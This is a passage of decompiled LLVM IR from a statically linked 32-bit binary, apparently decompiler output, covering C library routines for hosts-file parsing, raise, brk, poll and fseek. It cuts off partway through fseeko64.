  %v2_805682c = load i8, i8* %v1_805682c, align 1
  %v3_805682c = zext i8 %v2_805682c to i32
  %v5_805682c = and i32 %v6_805682c69, -256
  %v6_805682c = or i32 %v3_805682c, %v5_805682c
  %v4_805682e = icmp eq i8 %v2_805682c, 0
  br i1 %v4_805682e, label %dec_label_pc_805684b.preheader, label %dec_label_pc_8056832

dec_label_pc_8056832:                             ; preds = %dec_label_pc_8056832.lr.ph, %dec_label_pc_805682b
  %v6_805682c69 = phi i32 [ %v6_805682c64, %dec_label_pc_8056832.lr.ph ], [ %v6_805682c, %dec_label_pc_805682b ]
  %v2_805682c68 = phi i8 [ %v2_805682c61, %dec_label_pc_8056832.lr.ph ], [ %v2_805682c, %dec_label_pc_805682b ]
  %v0_805682b67 = phi i32 [ %v0_805682c.pre, %dec_label_pc_8056832.lr.ph ], [ %v1_805682b, %dec_label_pc_805682b ]
  store i32 %v0_8056832.pre, i32* @eax, align 4
  %v2_8056837 = sext i8 %v2_805682c68 to i32
  store i32 %v2_8056837, i32* @edx, align 4
  %v2_805683a = mul nsw i32 %v2_8056837, 2
  %v3_805683a = add i32 %v0_8056832.pre, %v2_805683a
  %v4_805683a = inttoptr i32 %v3_805683a to i8*
  %v5_805683a = load i8, i8* %v4_805683a, align 1
  %v6_805683a = and i8 %v5_805683a, 32
  %v7_805683a = icmp eq i8 %v6_805683a, 0
  %v1_805683e = icmp eq i1 %v7_805683a, false
  br i1 %v1_805683e, label %dec_label_pc_805684b.preheader, label %dec_label_pc_8056840

dec_label_pc_8056840:                             ; preds = %dec_label_pc_8056832
  %v10_8056840 = icmp eq i8 %v2_805682c68, 10
  %v1_8056843 = icmp eq i1 %v10_8056840, false
  br i1 %v1_8056843, label %dec_label_pc_805682b, label %dec_label_pc_805684b.preheader

dec_label_pc_805684b.preheader:                   ; preds = %dec_label_pc_8056840, %dec_label_pc_8056832, %dec_label_pc_805682b, %dec_label_pc_805681e
  %v0_805682b.lcssa = phi i32 [ %v0_805682c.pre, %dec_label_pc_805681e ], [ %v1_805682b, %dec_label_pc_805682b ], [ %v0_805682b67, %dec_label_pc_8056832 ], [ %v0_805682b67, %dec_label_pc_8056840 ]
  %v6_805682c.lcssa = phi i32 [ %v6_805682c64, %dec_label_pc_805681e ], [ %v6_805682c, %dec_label_pc_805682b ], [ %v6_805682c69, %dec_label_pc_8056832 ], [ %v6_805682c69, %dec_label_pc_8056840 ]
  %v1_805684b75 = inttoptr i32 %v0_805682b.lcssa to i8*
  %v2_805684b76 = load i8, i8* %v1_805684b75, align 1
  %v3_805684b77 = zext i8 %v2_805684b76 to i32
  %v5_805684b78 = and i32 %v6_805682c.lcssa, -256
  %v6_805684b79 = or i32 %v3_805684b77, %v5_805684b78
  store i32 %v6_805684b79, i32* @ecx, align 4
  %v4_805684d80 = icmp eq i8 %v2_805684b76, 0
  br i1 %v4_805684d80, label %dec_label_pc_8056864, label %dec_label_pc_8056851

dec_label_pc_8056847:                             ; preds = %dec_label_pc_805685f, %dec_label_pc_8056851
  store i8 0, i8* %v1_805684b83, align 1
  %v0_805684a = load i32, i32* @ebx, align 4
  %v1_805684a = add i32 %v0_805684a, 1
  store i32 %v1_805684a, i32* @ebx, align 4
  %v4_805684b.pre = load i32, i32* @ecx, align 4
  %v1_805684b = inttoptr i32 %v1_805684a to i8*
  %v2_805684b = load i8, i8* %v1_805684b, align 1
  %v3_805684b = zext i8 %v2_805684b to i32
  %v5_805684b = and i32 %v4_805684b.pre, -256
  %v6_805684b = or i32 %v3_805684b, %v5_805684b
  store i32 %v6_805684b, i32* @ecx, align 4
  %v4_805684d = icmp eq i8 %v2_805684b, 0
  br i1 %v4_805684d, label %dec_label_pc_8056864, label %dec_label_pc_8056851

dec_label_pc_8056851:                             ; preds = %dec_label_pc_805684b.preheader, %dec_label_pc_8056847
  %v2_805684b84 = phi i8 [ %v2_805684b, %dec_label_pc_8056847 ], [ %v2_805684b76, %dec_label_pc_805684b.preheader ]
  %v1_805684b83 = phi i8* [ %v1_805684b, %dec_label_pc_8056847 ], [ %v1_805684b75, %dec_label_pc_805684b.preheader ]
  %v0_805686882 = phi i32 [ %v1_805684a, %dec_label_pc_8056847 ], [ %v0_805682b.lcssa, %dec_label_pc_805684b.preheader ]
  %v0_8056851 = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_8056851, i32* @eax, align 4
  %v2_8056856 = sext i8 %v2_805684b84 to i32
  store i32 %v2_8056856, i32* @edx, align 4
  %v2_8056859 = mul nsw i32 %v2_8056856, 2
  %v3_8056859 = add i32 %v0_8056851, %v2_8056859
  %v4_8056859 = inttoptr i32 %v3_8056859 to i8*
  %v5_8056859 = load i8, i8* %v4_8056859, align 1
  %v6_8056859 = and i8 %v5_8056859, 32
  %v7_8056859 = icmp eq i8 %v6_8056859, 0
  %v1_805685d = icmp eq i1 %v7_8056859, false
  br i1 %v1_805685d, label %dec_label_pc_8056847, label %dec_label_pc_805685f

dec_label_pc_805685f:                             ; preds = %dec_label_pc_8056851
  %v10_805685f = icmp eq i8 %v2_805684b84, 10
  br i1 %v10_805685f, label %dec_label_pc_8056847, label %dec_label_pc_8056864

dec_label_pc_8056864:                             ; preds = %dec_label_pc_8056847, %dec_label_pc_805685f, %dec_label_pc_805684b.preheader
  %v0_8056868.lcssa = phi i32 [ %v0_805682b.lcssa, %dec_label_pc_805684b.preheader ], [ %v0_805686882, %dec_label_pc_805685f ], [ %v1_805684a, %dec_label_pc_8056847 ]
  %v1_805684b.lcssa = phi i8* [ %v1_805684b75, %dec_label_pc_805684b.preheader ], [ %v1_805684b83, %dec_label_pc_805685f ], [ %v1_805684b, %dec_label_pc_8056847 ]
  %v4_8056864 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8056868 = load i8, i8* %v1_805684b.lcssa, align 1
  %v3_8056868 = icmp eq i8 %v2_8056868, 0
  br i1 %v3_8056868, label %dec_label_pc_8056874, label %dec_label_pc_805686d

dec_label_pc_805686d:                             ; preds = %dec_label_pc_8056868.preheader, %dec_label_pc_8056864
  %v0_8056822 = phi i32 [ %v0_8056868.lcssa, %dec_label_pc_8056864 ], [ %v0_80567ea56, %dec_label_pc_8056868.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8056864, %dec_label_pc_8056864 ], [ 0, %dec_label_pc_8056868.preheader ]
  %v7_8056872 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8056872, label %dec_label_pc_8056874, label %dec_label_pc_805681e

dec_label_pc_8056874:                             ; preds = %dec_label_pc_8056864, %dec_label_pc_805686d, %dec_label_pc_8056868.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8056868.preheader ], [ %v4_8056864, %dec_label_pc_8056864 ], [ %stack_var_-196.013, %dec_label_pc_805686d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_805687b = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805af87.558 to i32), i32* %stack_var_-216, align 4
  %v5_8056888 = call i32 @__GI_strcoll(i8* %v4_8056888, i32 ptrtoint ([11 x i8]* @global_var_805af87.558 to i32), i32 %v0_805687b, i32 %v0_805687b)
  store i32 %v5_8056888, i32* @eax, align 4
  %v1_8056890 = icmp eq i32 %v5_8056888, 0
  br i1 %v1_8056890, label %dec_label_pc_80568b8.preheader, label %dec_label_pc_80568c9

dec_label_pc_80568b8.preheader:                   ; preds = %dec_label_pc_8056874
  %v0_80568b889 = load i32, i32* @esi, align 4
  %v5_80568bc98 = icmp slt i32 %v0_80568b889, %stack_var_-196.0.lcssa
  br i1 %v5_80568bc98, label %dec_label_pc_80568be.lr.ph, label %dec_label_pc_80568c9

dec_label_pc_80568be.lr.ph:                       ; preds = %dec_label_pc_80568b8.preheader
  %v0_80568be.pre = load i32, i32* @global_var_8061bf4.490, align 4
  br label %dec_label_pc_80568be

dec_label_pc_8056896:                             ; preds = %dec_label_pc_80568be
  %v2_8056899 = mul i32 %v0_80568b899, 4
  %v4_8056899 = add i32 %v2_8056899, %v3_8056899
  %v5_8056899 = inttoptr i32 %v4_8056899 to i32*
  %v6_8056899 = load i32, i32* %v5_8056899, align 4
  %v1_80568a0 = add i32 %v0_80568b899, 1
  store i32 %v1_80568a0, i32* @esi, align 4
  %v1_80568a1 = inttoptr i32 %v6_8056899 to i8*
  %v2_80568a1 = call i32 @__GI_strdup(i8* %v1_80568a1)
  %v1_80568a9 = load i32, i32* @ebx, align 4
  %v2_80568a9 = mul i32 %v1_80568a9, 4
  %v3_80568a9 = add i32 %v2_80568a9, 134618088
  %v4_80568a9 = inttoptr i32 %v3_80568a9 to i32*
  store i32 %v2_80568a1, i32* %v4_80568a9, align 4
  %v0_80568b0 = load i32, i32* @ebx, align 4
  %v1_80568b0 = add i32 %v0_80568b0, 1
  store i32 %v1_80568b0, i32* @eax, align 4
  store i32 %v1_80568b0, i32* @global_var_8061bf4.490, align 4
  %v0_80568b8 = load i32, i32* @esi, align 4
  %v5_80568bc = icmp slt i32 %v0_80568b8, %stack_var_-196.0.lcssa
  br i1 %v5_80568bc, label %dec_label_pc_80568be, label %dec_label_pc_80568c9

dec_label_pc_80568be:                             ; preds = %dec_label_pc_80568be.lr.ph, %dec_label_pc_8056896
  %v0_80568be = phi i32 [ %v0_80568be.pre, %dec_label_pc_80568be.lr.ph ], [ %v1_80568b0, %dec_label_pc_8056896 ]
  %v0_80568b899 = phi i32 [ %v0_80568b889, %dec_label_pc_80568be.lr.ph ], [ %v0_80568b8, %dec_label_pc_8056896 ]
  store i32 %v0_80568be, i32* @ebx, align 4
  %v7_80568c7 = icmp sgt i32 %v0_80568be, 2
  br i1 %v7_80568c7, label %dec_label_pc_80568c9, label %dec_label_pc_8056896

dec_label_pc_80568c9:                             ; preds = %dec_label_pc_80568b8.preheader, %dec_label_pc_8056896, %dec_label_pc_80568be, %dec_label_pc_8056874
  %v0_80568c9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805af92.559 to i32), i32* %stack_var_-216, align 4
  %v0_80568d0 = load i32, i32* @edi, align 4
  %v4_80568d1 = inttoptr i32 %v0_80568d0 to i8*
  %v5_80568d1 = call i32 @__GI_strcoll(i8* %v4_80568d1, i32 ptrtoint ([7 x i8]* @global_var_805af92.559 to i32), i32 %v0_80568c9, i32 %v0_80568c9)
  store i32 %v5_80568d1, i32* @eax, align 4
  %v1_80568d9 = icmp eq i32 %v5_80568d1, 0
  br i1 %v1_80568d9, label %dec_label_pc_805691b.preheader, label %dec_label_pc_80568dd

dec_label_pc_80568dd:                             ; preds = %dec_label_pc_80568c9
  %v0_80568dd = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805af99.560 to i32), i32* %stack_var_-216, align 4
  %v0_80568e4 = load i32, i32* @edi, align 4
  %v4_80568e5 = inttoptr i32 %v0_80568e4 to i8*
  %v5_80568e5 = call i32 @__GI_strcoll(i8* %v4_80568e5, i32 ptrtoint ([7 x i8]* @global_var_805af99.560 to i32), i32 %v0_80568dd, i32 %v0_80568dd)
  %v1_80568ed = icmp eq i32 %v5_80568e5, 0
  br i1 %v1_80568ed, label %dec_label_pc_805691b.preheader, label %dec_label_pc_805695e

dec_label_pc_805691b.preheader:                   ; preds = %dec_label_pc_80568c9, %dec_label_pc_80568dd
  %v0_805691b100 = load i32, i32* @global_var_8061bf8.553, align 8
  %tmp43103 = icmp slt i32 %v0_805691b100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_80568f3, label %dec_label_pc_8056924

dec_label_pc_80568f3:                             ; preds = %dec_label_pc_805691b.preheader, %dec_label_pc_80568f3.dec_label_pc_80568f3_crit_edge
  %v0_805691b105 = phi i32 [ %v0_805691b, %dec_label_pc_80568f3.dec_label_pc_80568f3_crit_edge ], [ %v0_805691b100, %dec_label_pc_805691b.preheader ]
  %v1_80568f3 = add i32 %v0_805691b105, -1
  %v1_80568f7 = mul i32 %v1_80568f3, 4
  %v2_80568f7 = add i32 %v1_80568f7, 134618072
  %v3_80568f7 = inttoptr i32 %v2_80568f7 to i32*
  %v4_80568f7 = load i32, i32* %v3_80568f7, align 4
  store i32 %v1_80568f3, i32* @global_var_8061bf8.553, align 8
  %v1_8056903 = call i32 @free(i32 %v4_80568f7)
  %v0_8056908 = load i32, i32* @global_var_8061bf8.553, align 8
  %v1_8056910 = mul i32 %v0_8056908, 4
  %v2_8056910 = add i32 %v1_8056910, ptrtoint (i32* @global_var_8061bd8.561 to i32)
  %v3_8056910 = inttoptr i32 %v2_8056910 to i32*
  store i32 0, i32* %v3_8056910, align 4
  %v0_805691b = load i32, i32* @global_var_8061bf8.553, align 8
  %tmp43 = icmp slt i32 %v0_805691b, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80568f3.dec_label_pc_80568f3_crit_edge, label %dec_label_pc_8056924

dec_label_pc_80568f3.dec_label_pc_80568f3_crit_edge: ; preds = %dec_label_pc_80568f3
  br label %dec_label_pc_80568f3

dec_label_pc_8056924:                             ; preds = %dec_label_pc_80568f3, %dec_label_pc_805691b.preheader
  %v0_805691b.lcssa = phi i32 [ %v0_805691b100, %dec_label_pc_805691b.preheader ], [ %v0_805691b, %dec_label_pc_80568f3 ]
  store i32 1, i32* @esi, align 4
  %v5_8056951115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8056951115, label %dec_label_pc_8056953, label %dec_label_pc_805695e

dec_label_pc_805692b:                             ; preds = %dec_label_pc_8056953
  %v2_805692e = mul i32 %v0_8056935117, 4
  %v4_805692e = add i32 %v2_805692e, %v3_8056899
  %v5_805692e = inttoptr i32 %v4_805692e to i32*
  %v6_805692e = load i32, i32* %v5_805692e, align 4
  %v1_8056935 = add i32 %v0_8056935117, 1
  store i32 %v1_8056935, i32* @esi, align 4
  %v1_8056936 = inttoptr i32 %v6_805692e to i8*
  %v2_8056936 = call i32 @__GI_strdup(i8* %v1_8056936)
  %v1_805693e = load i32, i32* @ebx, align 4
  %v2_805693e = mul i32 %v1_805693e, 4
  %v3_805693e = add i32 %v2_805693e, 134618072
  %v4_805693e = inttoptr i32 %v3_805693e to i32*
  store i32 %v2_8056936, i32* %v4_805693e, align 4
  %v0_8056945 = load i32, i32* @ebx, align 4
  %v1_8056945 = add i32 %v0_8056945, 1
  store i32 %v1_8056945, i32* @global_var_8061bf8.553, align 8
  %v0_805694d.pre = load i32, i32* @esi, align 4
  %v5_8056951 = icmp slt i32 %v0_805694d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8056951, label %dec_label_pc_8056953, label %dec_label_pc_805695e

dec_label_pc_8056953:                             ; preds = %dec_label_pc_8056924, %dec_label_pc_805692b
  %v0_8056935117 = phi i32 [ %v0_805694d.pre, %dec_label_pc_805692b ], [ 1, %dec_label_pc_8056924 ]
  %v0_8056953116 = phi i32 [ %v1_8056945, %dec_label_pc_805692b ], [ %v0_805691b.lcssa, %dec_label_pc_8056924 ]
  store i32 %v0_8056953116, i32* @ebx, align 4
  %v7_805695c = icmp sgt i32 %v0_8056953116, 3
  br i1 %v7_805695c, label %dec_label_pc_805695e, label %dec_label_pc_805692b

dec_label_pc_805695e:                             ; preds = %dec_label_pc_80567eb.preheader, %dec_label_pc_80567ea, %dec_label_pc_8056924, %dec_label_pc_8056953, %dec_label_pc_805692b, %dec_label_pc_80568dd, %dec_label_pc_805680c, %dec_label_pc_8056803, %dec_label_pc_805695e.preheader
  %v0_805695e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8056965, i32* @ebx, align 4
  %v3_805696a = call i32 @fgets(i32 %v2_8056965, i32 128, i32 %v0_805695e)
  store i32 %v3_805696a, i32* @eax, align 4
  %v1_8056972 = icmp eq i32 %v3_805696a, 0
  %v1_8056974 = icmp eq i1 %v1_8056972, false
  br i1 %v1_8056974, label %dec_label_pc_80567eb.preheader, label %dec_label_pc_805697a

dec_label_pc_80567eb.preheader:                   ; preds = %dec_label_pc_805695e
  %v0_80567eb.pre = load i32, i32* @ebx, align 4
  %v4_80567eb.pre = load i32, i32* @ecx, align 4
  %v1_80567eb49 = inttoptr i32 %v0_80567eb.pre to i8*
  %v2_80567eb50 = load i8, i8* %v1_80567eb49, align 1
  %v3_80567eb51 = zext i8 %v2_80567eb50 to i32
  %v5_80567eb52 = and i32 %v4_80567eb.pre, -256
  %v6_80567eb53 = or i32 %v3_80567eb51, %v5_80567eb52
  store i32 %v6_80567eb53, i32* @ecx, align 4
  %v4_80567ed54 = icmp eq i8 %v2_80567eb50, 0
  br i1 %v4_80567ed54, label %dec_label_pc_805695e, label %dec_label_pc_80567f5.lr.ph

dec_label_pc_80567f5.lr.ph:                       ; preds = %dec_label_pc_80567eb.preheader
  %v0_80567f5.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_80567f5

dec_label_pc_805697a:                             ; preds = %dec_label_pc_805695e
  %v0_805697d = load i32, i32* @ebp, align 4
  %v1_805697e = inttoptr i32 %v0_805697d to i16*
  %v2_805697e = call i32 @__GI_fclose(i16* %v1_805697e)
  br label %dec_label_pc_8056993

dec_label_pc_8056988:                             ; preds = %dec_label_pc_80567c7
  %v0_8056988 = call i32 @__GI___h_errno_location()
  %v1_805698d = inttoptr i32 %v0_8056988 to i32*
  store i32 3, i32* %v1_805698d, align 4
  br label %dec_label_pc_8056993

dec_label_pc_8056993:                             ; preds = %entry, %dec_label_pc_805697a, %dec_label_pc_8056988
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056780, i32* @eax, align 4
  %v2_805699f = call i32 @__pthread_return_void(i32 %v2_8056780, i32 1)
  store i32 %v0_805676c, i32* @ebp, align 4
  ret i32 %v2_805699f

; uselistorder directives
  uselistorder i32 %v0_80567f5.pre, { 1, 0 }
  uselistorder i32 %v6_80567eb53, { 1, 0 }
  uselistorder i8 %v2_80567eb50, { 1, 2, 0 }
  uselistorder i8* %v1_80567eb49, { 1, 0 }
  uselistorder i32 %v0_80567eb.pre, { 1, 0 }
  uselistorder i32 %v0_805691b, { 0, 2, 1 }
  uselistorder i32 %v0_80568be, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8056856, { 1, 0 }
  uselistorder i32 %v2_8056837, { 1, 0 }
  uselistorder i32 %v1_805682b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80567fa, { 1, 0 }
  uselistorder i32 %v1_80567ea, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 18, 15, 14, 13, 12, 11, 10, 9, 26, 25, 24, 23, 1, 8, 7, 6, 5, 4, 17, 16, 19, 22, 21, 20, 3, 2, 0 }
  uselistorder i32* @global_var_8061bf8.553, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8061bf4.490, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805b508.489 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8056993, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805695e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8056953, { 1, 0 }
  uselistorder label %dec_label_pc_80568f3, { 1, 0 }
  uselistorder label %dec_label_pc_805691b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80568c9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80568be, { 1, 0 }
  uselistorder label %dec_label_pc_8056874, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805686d, { 1, 0 }
  uselistorder label %dec_label_pc_8056864, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056851, { 1, 0 }
  uselistorder label %dec_label_pc_8056832, { 1, 0 }
  uselistorder label %dec_label_pc_805695e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80569d3 = inttoptr i32 %arg3 to i32*
  %v10_80569d3 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80569d3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80569d3
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80569df = call i32 @__libc_getpid()
  %v2_80569eb = call i32 @kill(i32 %v0_80569df, i32 %arg1)
  ret i32 %v2_80569eb

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80569f4 = load i32, i32* @eax, align 4
  %v1_80569f4 = add i32 %v0_80569f4, 28
  %v2_80569f4 = inttoptr i32 %v1_80569f4 to i32*
  %v3_80569f4 = load i32, i32* %v2_80569f4, align 4
  store i32 %v3_80569f4, i32* @global_var_8061bfc.562, align 4
  %v1_80569fd = add i32 %v0_80569f4, 44
  %v2_80569fd = inttoptr i32 %v1_80569fd to i32*
  %v3_80569fd = load i32, i32* %v2_80569fd, align 4
  store i32 %v3_80569fd, i32* @global_var_8061c00.563, align 1024
  ret i32 %v3_80569fd
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056a08 = load i32, i32* @ebx, align 4
  store i32 %v0_8056a08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8056a1b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8056a1b, i32* @global_var_80617c4.540, align 4
  %v7_8056a26 = icmp ult i32 %v1_8056a1b, %arg1
  %v1_8056a28 = icmp eq i1 %v7_8056a26, false
  br i1 %v1_8056a28, label %dec_label_pc_8056a38, label %dec_label_pc_8056a2a

dec_label_pc_8056a2a:                             ; preds = %entry
  %v0_8056a2a = load i32, i32* %stack_var_-4, align 4
  %v1_8056a2a = call i32 @__errno_location(i32 %v0_8056a2a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8056a32 = inttoptr i32 %v1_8056a2a to i32*
  store i32 12, i32* %v1_8056a32, align 4
  %v0_8056a39.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056a38

dec_label_pc_8056a38:                             ; preds = %entry, %dec_label_pc_8056a2a
  %v0_8056a39 = phi i32 [ 0, %entry ], [ %v0_8056a39.pre, %dec_label_pc_8056a2a ]
  %v2_8056a3c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056a3c, i32* @ebx, align 4
  ret i32 %v0_8056a39

; uselistorder directives
  uselistorder i32 %v1_8056a1b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80617c4.540, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056a38, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056a40 = load i32, i32* @edi, align 4
  store i32 %v0_8056a40, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8056a50 = load i32, i32* @ebx, align 4
  %v1_8056a51 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8056a58 = call i32 @poll(%pollfd* %v1_8056a51, i32 %tmp3, i32 %tmp)
  store i32 %v0_8056a50, i32* @ebx, align 4
  store i32 %v5_8056a58, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8056a58, -4095
  br i1 %tmp10, label %dec_label_pc_8056a70, label %dec_label_pc_8056a64

dec_label_pc_8056a64:                             ; preds = %entry
  %v1_8056a64 = call i32 @__errno_location(i32 %v0_8056a50)
  %v0_8056a69 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056a69 = sub i32 0, %v0_8056a69
  %v2_8056a6b = inttoptr i32 %v1_8056a64 to i32*
  store i32 %v1_8056a69, i32* %v2_8056a6b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056a70

dec_label_pc_8056a70:                             ; preds = %entry, %dec_label_pc_8056a64
  %v0_8056a71 = phi i32 [ %v5_8056a58, %entry ], [ -1, %dec_label_pc_8056a64 ]
  %v2_8056a74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056a74, i32* @edi, align 4
  ret i32 %v0_8056a71

; uselistorder directives
  uselistorder i32 %v5_8056a58, { 1, 0, 2 }
  uselistorder i32 %v0_8056a50, { 1, 0 }
  uselistorder label %dec_label_pc_8056a70, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8056a83 = ashr i32 %arg2, 31
  %v4_8056a8a = inttoptr i32 %arg1 to i16*
  %v5_8056a8a = call i32 @__GI_fseeko64(i16* %v4_8056a8a, i32 %arg2, i32 %v1_8056a83, i32 %arg3)
  ret i32 %v5_8056a8a
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8056a94 = load i32, i32* @ebp, align 4
  %v0_8056a95 = load i32, i32* @edi, align 4
  %v0_8056a96 = load i32, i32* @esi, align 4
  %v0_8056a97 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8056aa7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056aa7, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8056acb, label %dec_label_pc_8056ab8

dec_label_pc_8056ab8:                             ; preds = %entry
  %v1_8056ab8 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8056ab8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8056ac0 = inttoptr i32 %v1_8056ab8 to i32*
  store i32 22, i32* %v1_8056ac0, align 4
  br label %dec_label_pc_8056b71

dec_label_pc_8056acb:                             ; preds = %entry
  %v1_8056acb = add i32 %v4_8056aa7, 52
  %v2_8056acb = inttoptr i32 %v1_8056acb to i32*
  %v3_8056acb = load i32, i32* %v2_8056acb, align 4
  %v1_8056ace = icmp eq i32 %v3_8056acb, 0
  %v1_8056ad0 = icmp eq i1 %v1_8056ace, false
  br i1 %v1_8056ad0, label %dec_label_pc_8056af1, label %dec_label_pc_8056ad2

dec_label_pc_8056ad2:                             ; preds = %dec_label_pc_8056acb
  %v1_8056ad2 = add i32 %v4_8056aa7, 56
  store i32 %v1_8056ad2, i32* @ebx, align 4
  %v2_8056adc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056adc, i32* @eax, align 4
  %v3_8056ae1 = call i32 @__pthread_return_void(i32 %v2_8056adc, i32 134565087)
  store i32 %v3_8056ae1, i32* %eax.global-to-local, align 4
  %v0_8056ae6 = load i32, i32* @ebx, align 4
  %v2_8056ae9 = call i32 @__pthread_return_0(i32 %v0_8056ae6)
  store i32 %v2_8056ae9, i32* %eax.global-to-local, align 4
  %v0_8056af1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056af1

dec_label_pc_8056af1:                             ; preds = %dec_label_pc_8056acb, %dec_label_pc_8056ad2
  %v0_8056af9 = phi i32 [ %v4_8056aa7, %dec_label_pc_8056acb ], [ %v0_8056af1.pre, %dec_label_pc_8056ad2 ]
  %v1_8056af1 = inttoptr i32 %v0_8056af9 to i8*
  %v2_8056af1 = load i8, i8* %v1_8056af1, align 1
  %v3_8056af1 = and i8 %v2_8056af1, 64
  %v4_8056af1 = icmp eq i8 %v3_8056af1, 0
  br i1 %v4_8056af1, label %dec_label_pc_8056b06, label %dec_label_pc_8056af6

dec_label_pc_8056af6:                             ; preds = %dec_label_pc_8056af1
  %v2_8056afa = call i32 @__stdio_wcommit(i32 %v0_8056af9)
  store i32 %v2_8056afa, i32* %eax.global-to-local, align 4
  %v1_8056b02 = icmp eq i32 %v2_8056afa, 0
  %v1_8056b04 = icmp eq i1 %v1_8056b02, false
  br i1 %v1_8056b04, label %dec_label_pc_8056b59, label %dec_label_pc_8056b06

dec_label_pc_8056b06:                             ; preds = %dec_label_pc_8056af6, %dec_label_pc_8056af1
  %v0_8056b06 = load i32, i32* @edi, align 4
  %v9_8056b06 = icmp eq i32 %v0_8056b06, 1
